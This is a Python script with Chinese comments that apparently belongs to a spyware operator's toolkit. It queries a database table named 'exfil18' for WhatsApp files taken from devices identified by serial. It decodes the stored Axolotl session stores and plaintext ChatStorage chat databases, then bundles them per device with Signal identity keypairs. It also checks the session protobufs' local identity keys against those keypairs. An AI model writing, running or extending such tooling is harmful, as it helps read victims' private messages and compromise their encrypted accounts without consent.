#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
split_wa_signals.py —— 按设备打包 WhatsApp Signal 全套材料（identity 密钥对 + Axolotl.sqlite + ChatStorage.sqlite）

输入:
  --identity-dir  data/wa_identity_keypairs   （tools/split_identity_keypairs.py 的产出）
  --inventory     data/wa_artifacts_inventory.tsv
                  serial|kind|srcpath|orig_size|bin_path|ts   kind ∈ {axolotl, chatstorage}
                  生成方式见 --dump-inventory（走本机 PG）

输出:  <out>/<SERIAL>/
         identity/                 沿用 identity-dir 里的那一份（identity.json / MAIN.json / raw/…）
         Axolotl/<APP>_<name>.sqlite     从 ext_stats_*.bin 解出来的原始库
         ChatStorage/<APP>_<name>.sqlite
         signal_summary.json       每库表行数 + 会话里的 localIdentityPublic + 与 identity 包的比对
         manifest.json             设备档案（文件清单 + sha256）

用法:
  python3 tools/split_wa_signals.py --serial C4XJFXY3MJ
  python3 tools/split_wa_signals.py --serial C477GG3542
  python3 tools/split_wa_signals.py                 # 全部
  python3 tools/split_wa_signals.py --dump-inventory   # 重新生成库存清单
"""
import os, sys, re, json, base64, sqlite3, hashlib, shutil, argparse, subprocess, tempfile
from collections import Counter, defaultdict

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DEFAULT_IDDIR = os.path.join(ROOT, 'data', 'wa_identity_keypairs')
DEFAULT_INV = os.path.join(ROOT, 'data', 'wa_artifacts_inventory.tsv')
DEFAULT_OUT = os.path.join(ROOT, 'data', 'wa_signal_packages')
INV_SQL = """\\pset tuples_only on
select serial,
       case when data->>'path' like '%Axolotl.sqlite%' then 'axolotl'
            when data->>'path' like '%ChatStorage.sqlite%' then 'chatstorage'
            else 'wa' end,
       data->>'path', coalesce(data->>'orig_size','0'), bin_path, ts,
       coalesce(data->>'description','')
from exfil18
where data->>'path' like '%Axolotl.sqlite%'
   or data->>'path' like '%ChatStorage.sqlite%'
   or data->>'category' = 'whatsapp'
order by serial, 3, ts;"""


# ── protobuf 最小解析（取 SessionStructure.localIdentityPublic）──
def _rv(b, i):
    r = 0; s = 0
    while True:
        x = b[i]; i += 1; r |= (x & 0x7f) << s; s += 7
        if not x & 0x80:
            return r, i


def _pbmap(b):
    i = 0; d = {}
    while i < len(b):
        k, i = _rv(b, i); fn, wt = k >> 3, k & 7
        if wt == 2:
            l, i = _rv(b, i); d[fn] = b[i:i + l]; i += l
        elif wt == 0:
            _, i = _rv(b, i)
        else:
            break
    return d


def app_of(srcpath, descr=''):
    blob = (srcpath or '') + ' ' + (descr or '')
    if 'WhatsAppSMB' in blob or 'whatsapp.WhatsAppSMB' in blob:
        return 'SMB'
    if 'net.whatsapp.WhatsApp.shared' in blob or 'WhatsApp.shared' in blob or 'whatsapp' in blob.lower():
        return 'MAIN'
    return 'OTHER'


def sha256f(p):
    h = hashlib.sha256()
    with open(p, 'rb') as f:
        for c in iter(lambda: f.read(1 << 20), b''):
            h.update(c)
    return h.hexdigest()


def dump_inventory(path):
    sql = os.path.join(tempfile.gettempdir(), 'wa_inv.sql')
    open(sql, 'w').write(INV_SQL)
    os.chmod(sql, 0o644)
    r = subprocess.run(['su', 'postgres', '-c', 'psql -d panel -A -F"|" -t -f %s' % sql],
                       capture_output=True, text=True)
    lines = [l for l in r.stdout.splitlines()
             if l.count('|') >= 5 and not l.startswith('Output format') and not l.startswith('Tuples')]
    open(path, 'w').write('\n'.join(lines) + '\n')
    print('[+] 库存清单 %d 行 → %s' % (len(lines), path))
    if r.stderr.strip():
        print('    stderr: %s' % r.stderr.strip()[:200])


def load_inventory(path):
    inv = defaultdict(list)
    for line in open(path, encoding='utf-8'):
        p = line.rstrip('\n').split('|')
        if len(p) < 6:
            continue
        inv[p[0]].append({'kind': p[1], 'srcpath': p[2], 'orig_size': int(p[3] or 0),
                          'bin_path': p[4], 'ts': p[5],
                          'descr': p[6] if len(p) > 6 else ''})
    return inv


def summarize_axolotl(dbpath):
    s = {'sessions': 0, 'prekeys': 0, 'signed_prekeys': 0, 'contact_identities': 0,
         'localIdentityPublic': None, 'localIdentityPublic_unique': 0, 'tableRows': {}}
    try:
        c = sqlite3.connect(dbpath)
        tabs = [r[0] for r in c.execute("select name from sqlite_master where type='table'")]
        for t in tabs:
            if t.startswith('Z_') or t == 'sqlite_sequence':
                continue
            try:
                s['tableRows'][t] = c.execute('select count(*) from "%s"' % t).fetchone()[0]
            except Exception:
                pass
        s['sessions'] = s['tableRows'].get('ZWAAXOLOTLSESSION', 0)
        s['prekeys'] = s['tableRows'].get('ZWAPREKEY', 0)
        s['signed_prekeys'] = s['tableRows'].get('ZWASIGNEDPREKEY', 0)
        s['contact_identities'] = s['tableRows'].get('ZWAAXOLOTLIDENTITY', 0)
        pubs = Counter()
        for (sd,) in c.execute("select ZSESSIONDATA from ZWAAXOLOTLSESSION where ZSESSIONDATA is not null limit 5000"):
            try:
                ss = _pbmap(sd).get(1)
                if not ss:
                    continue
                li = _pbmap(ss).get(2)
                if li and len(li) == 33:
                    pubs[li.hex()] += 1
            except Exception:
                pass
        if pubs:
            s['localIdentityPublic'] = pubs.most_common(1)[0][0]
            s['localIdentityPublic_unique'] = len(pubs)
    except Exception as e:
        s['error'] = str(e)
    return s


def split_one(serial, arts, args, identity_src, out_root):
    d = os.path.join(out_root, serial)
    os.makedirs(d, exist_ok=True)

    # 1) identity 包
    idsrc = os.path.join(identity_src, serial)
    if os.path.isdir(idsrc):
        dst = os.path.join(d, 'identity')
        if os.path.isdir(dst):
            shutil.rmtree(dst)
        shutil.copytree(idsrc, dst)

    kpubs = set()
    idjson = os.path.join(idsrc, 'identity.json')
    if os.path.exists(idjson):
        for k in json.load(open(idjson, encoding='utf-8'))['keypairs']:
            kpubs.add(k['pub'])

    # 2) 原始库
    manifest = []
    summary = {'serial': serial, 'apps': {}, 'identityPackage': os.path.isdir(idsrc),
               'identityPublics': sorted(kpubs)}
    for a in arts:
        app = app_of(a['srcpath'], a.get('descr', ''))
        if a['kind'] == 'axolotl':
            sub = 'Axolotl'
        elif a['kind'] == 'chatstorage':
            sub = 'ChatStorage'
        else:
            sub = 'WhatsApp'
        if a['kind'] == 'axolotl' and args.no_axolotl:
            continue
        if a['kind'] == 'chatstorage' and args.no_chatstorage:
            continue
        if a['kind'] == 'wa' and args.no_wa_misc:
            continue
        # 同 kind+app+源文件 保留最新一份
        key = (a['kind'], app, a['srcpath'] if a['kind'] == 'wa' else '')
        prev = summary['apps'].setdefault(key, None)
        if prev and int(prev['ts']) >= int(a['ts']):
            continue
        if not os.path.exists(a['bin_path']):
            summary['apps'][key] = {'kind': a['kind'], 'app': app, 'missing': a['bin_path']}
            continue
        raw = open(a['bin_path'], 'rb').read()
        data = base64.b64decode(json.loads(raw)['data']) if raw.lstrip()[:1] == b'{' else raw
        name = '%s_%s' % (app, os.path.basename(a['srcpath']))
        odir = os.path.join(d, sub)
        os.makedirs(odir, exist_ok=True)
        op = os.path.join(odir, name)
        open(op, 'wb').write(data)
        rec = {'kind': a['kind'], 'app': app, 'srcpath': a['srcpath'],
               'file': os.path.relpath(op, d), 'bytes': len(data), 'ts': a['ts'],
               'bin_path': a['bin_path'], 'sha256': sha256f(op)}
        if a['kind'] == 'axolotl':
            rec['summary'] = summarize_axolotl(op)
            lip = rec['summary'].get('localIdentityPublic')
            rec['identityPackageMatch'] = bool(lip and lip in kpubs)
        summary['apps'][key] = rec
        manifest.append({'file': rec['file'], 'bytes': rec['bytes'], 'sha256': rec['sha256']})
    summary['apps'] = {'%s/%s' % (k[0], (k[1] + ('/' + os.path.basename(k[2]) if k[2] else ''))): v
                       for k, v in summary['apps'].items()}

    with open(os.path.join(d, 'signal_summary.json'), 'w', encoding='utf-8') as f:
        json.dump(summary, f, ensure_ascii=False, indent=1)
    with open(os.path.join(d, 'manifest.json'), 'w', encoding='utf-8') as f:
        json.dump({'serial': serial, 'files': manifest,
                   'totalBytes': sum(m['bytes'] for m in manifest),
                   'identityPackage': os.path.isdir(idsrc)}, f, ensure_ascii=False, indent=1)
    return summary


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--identity-dir', default=DEFAULT_IDDIR)
    ap.add_argument('--inventory', default=DEFAULT_INV)
    ap.add_argument('--out', default=DEFAULT_OUT)
    ap.add_argument('--serial', action='append')
    ap.add_argument('--dump-inventory', action='store_true')
    ap.add_argument('--no-axolotl', action='store_true')
    ap.add_argument('--no-chatstorage', action='store_true')
    ap.add_argument('--no-wa-misc', action='store_true', help='不打包 whatsapp 分类里的其它库(NoteStore/LocalKeyValue 等)')
    a = ap.parse_args()

    if a.dump_inventory or not os.path.exists(a.inventory):
        dump_inventory(a.inventory)

    inv = load_inventory(a.inventory)
    idxp = os.path.join(a.identity_dir, 'INDEX.json')
    have_id = set()
    if os.path.exists(idxp):
        have_id = {e['serial'] for e in json.load(open(idxp, encoding='utf-8'))['index']}

    targets = sorted(set(inv) | have_id)
    if a.serial:
        targets = [s for s in targets if s in set(a.serial)]

    os.makedirs(a.out, exist_ok=True)
    print('[*] 目标设备 %d 台' % len(targets))
    didx = []
    for s in targets:
        sm = split_one(s, inv.get(s, []), a, a.identity_dir, a.out)
        ax = [v for k, v in sm['apps'].items() if k.startswith('axolotl') and not v.get('missing')]
        cs = [v for k, v in sm['apps'].items() if k.startswith('chatstorage') and not v.get('missing')]
        wa = [v for k, v in sm['apps'].items() if k.startswith('wa/') and not v.get('missing')]
        didx.append({'serial': s, 'identityPackage': sm['identityPackage'],
                     'axolotl': len(ax), 'chatstorage': len(cs), 'waMisc': len(wa),
                     'bytes': sum(v['bytes'] for v in list(sm['apps'].values()) if isinstance(v, dict) and 'bytes' in v)})
        print('    %-14s identity=%-5s axolotl=%d chatstorage=%d wa=%d  %s'
              % (s, sm['identityPackage'], len(ax), len(cs), len(wa),
                 '%.1f MB' % (didx[-1]['bytes'] / 1048576)))
    with open(os.path.join(a.out, 'INDEX.json'), 'w', encoding='utf-8') as f:
        json.dump({'devices': len(didx), 'index': didx,
                   'note': 'identity/ = Signal identity 密钥对；Axolotl/ = Signal 会话/预共享密钥库；'
                           'ChatStorage/ = WhatsApp 聊天库（明文）；signal_summary.json = 每库摘要与比对'},
                  f, ensure_ascii=False, indent=1)
    print('[+] 完成 → %s' % a.out)


if __name__ == '__main__':
    main()
